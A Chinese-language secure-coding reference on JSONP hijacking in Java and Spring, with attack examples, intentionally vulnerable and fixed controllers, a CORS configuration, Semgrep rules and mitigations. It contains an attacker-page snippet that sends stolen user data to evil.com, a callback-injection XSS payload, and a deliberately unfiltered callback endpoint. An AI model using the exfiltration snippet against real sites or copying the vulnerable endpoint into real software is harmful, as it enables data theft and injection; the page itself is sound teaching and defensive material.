---
id: JSONP-HIJACKING
name: JSONP 劫持
severity: medium
owasp: "A01:2025"
cwe: ["CWE-346", "CWE-352"]
category: authentication
frameworks: [Servlet, Spring MVC, Jackson, Fastjson]
last_updated: "2026-04-17"
doc_version: "1.0"
---

# JSONP 劫持

> 最后更新：2026-04-17

## 概述

JSONP（JSON with Padding）是一种绕过同源策略的跨域数据获取方式，通过动态创建 `<script>` 标签加载服务端返回的 callback 包裹数据。JSONP 劫持是指攻击者在恶意页面中构造 `<script>` 标签，利用用户已认证的会话访问 JSONP 接口，从而窃取敏感数据。

## 风险等级

| 维度 | 评级 |
|------|------|
| OWASP Top 10 | A01:2025 - Broken Access Control |
| CWE | CWE-346 (Origin Validation Error), CWE-352 (CSRF) |
| 严重程度 | 中危 |

## 攻击类型

### 1. 基本 JSONP 劫持

```
# 服务端 JSONP 接口
GET /api/user/info?callback=handleUserInfo HTTP/1.1
Cookie: session=abc123

# 响应
handleUserInfo({"username":"admin","email":"admin@example.com","phone":"13800138000"})
```

```html
<!-- 攻击者页面 -->
<script>
function handleUserInfo(data) {
    // 窃取用户数据发送到攻击者服务器
    fetch('https://evil.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));
}
</script>
<script src="https://target.com/api/user/info?callback=handleUserInfo"></script>
```

### 2. Callback 注入

```
# 恶意 callback 参数注入 XSS
GET /api/user/info?callback=<script>alert(1)</script> HTTP/1.1

# 如果服务端未过滤 callback 参数，直接返回：
<script>alert(1)</script>({"username":"admin"})
```

### 3. 与 CSRF 结合

JSONP 请求自动携带 Cookie，相当于天然的 CSRF 攻击载体。

## Java 场景

### 漏洞代码

```java
// [VULNERABLE] 文件说明：演示 JSONP 劫持漏洞，仅用于教学目的
// 漏洞类型：JSONP-HIJACKING
// 风险等级：medium
// 对应文档：docs/vulnerabilities/authentication/jsonp-hijacking.md

import org.springframework.web.bind.annotation.*;

@RestController
@RequestMapping("/api")
public class JsonpVulnerable {

    // [VULNERABLE] 直接使用用户提供的 callback 参数
    @GetMapping("/user/info")
    public String getUserInfo(@RequestParam String callback) {
        String jsonData = "{\"username\":\"admin\",\"email\":\"admin@example.com\"}";
        // callback 未过滤，且无 Referer/Origin 校验
        return callback + "(" + jsonData + ")"; // JSONP 劫持 + XSS
    }

    // [VULNERABLE] 使用 Spring 4.2+ 的 @ResponseBody JSONP 支持
    // 但未配置安全限制
}
```

### 安全代码

```java
// [SECURE] 文件说明：演示 JSONP 劫持漏洞的安全修复方案
// 修复方式：使用 CORS 替代 JSONP / 校验 Referer / 过滤 callback
// 对应文档：docs/vulnerabilities/authentication/jsonp-hijacking.md

import org.springframework.web.bind.annotation.*;
import javax.servlet.http.*;
import java.util.regex.Pattern;

@RestController
@RequestMapping("/api")
public class JsonpSecure {

    // callback 参数白名单正则
    private static final Pattern CALLBACK_PATTERN =
        Pattern.compile("^[a-zA-Z_$][a-zA-Z0-9_$]*$");

    // [SECURE] 方案1：使用 CORS 替代 JSONP（推荐）
    @GetMapping("/user/info")
    public UserInfo getUserInfo() {
        // 返回纯 JSON，通过 CORS 头控制跨域访问
        return new UserInfo("admin", "admin@example.com");
    }

    // [SECURE] 方案2：如果必须保留 JSONP，校验 callback 和 Referer
    @GetMapping("/user/info/jsonp")
    public String getUserInfoJsonp(@RequestParam String callback,
                                    HttpServletRequest request) {
        // 1. 校验 callback 格式（仅允许字母数字下划线）
        if (!CALLBACK_PATTERN.matcher(callback).matches()) {
            throw new IllegalArgumentException("Invalid callback name");
        }

        // 2. 校验 Referer/Origin
        String referer = request.getHeader("Referer");
        if (referer == null || !referer.startsWith("https://trusted-domain.com")) {
            throw new SecurityException("Invalid origin");
        }

        String jsonData = "{\"username\":\"admin\"}";
        return callback + "(" + jsonData + ")";
    }

    record UserInfo(String username, String email) {}
}
```

### Spring CORS 配置

```java
// [SECURE] 全局 CORS 配置替代 JSONP
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://trusted-domain.com")  // [SECURE] 精确白名单
            .allowedMethods("GET", "POST")
            .allowCredentials(true);
    }
}
```

## 检测方法

1. **静态分析**：搜索 `callback`、`jsonp` 参数名，以及手动拼接 callback 的代码
2. **动态测试**：构造跨域 `<script>` 标签加载 JSONP 接口
3. **响应头检查**：检查 JSONP 响应是否包含 `Content-Type: application/javascript`

**Semgrep 规则**：

```yaml
rules:
  - id: java-jsonp-callback-injection
    patterns:
      - pattern: |
          $CALLBACK + "(" + $DATA + ")"
    message: |
      检测到手动拼接 JSONP callback，可能导致 JSONP 劫持或 XSS。
      建议：使用 CORS 替代 JSONP，或校验 callback 参数格式。
    severity: WARNING
    languages: [java]
    metadata:
      category: security
      subcategory: authentication
      cwe: CWE-346

  - id: java-jsonp-callback-param
    patterns:
      - pattern: |
          @RequestParam String callback
    message: |
      检测到 JSONP callback 参数，确保已校验格式和来源。
    severity: INFO
    languages: [java]
    metadata:
      category: security
      subcategory: authentication
      cwe: CWE-346
```

## 防护措施

| 优先级 | 措施 | 说明 |
|--------|------|------|
| P0 | 使用 CORS 替代 JSONP | CORS 提供更精细的跨域控制，是现代替代方案 |
| P1 | 校验 callback 格式 | 仅允许 `[a-zA-Z0-9_$]` 字符 |
| P1 | 校验 Referer/Origin | 确保请求来自可信来源 |
| P2 | 移除敏感接口的 JSONP 支持 | 敏感数据接口不应支持 JSONP |
| P2 | 设置 `X-Content-Type-Options: nosniff` | 防止浏览器将 JSONP 响应当 HTML 解析 |

## 参考资料

- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
- [OWASP JSONP Security](https://owasp.org/www-community/attacks/JSONp_hijacking)
- [MDN: CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
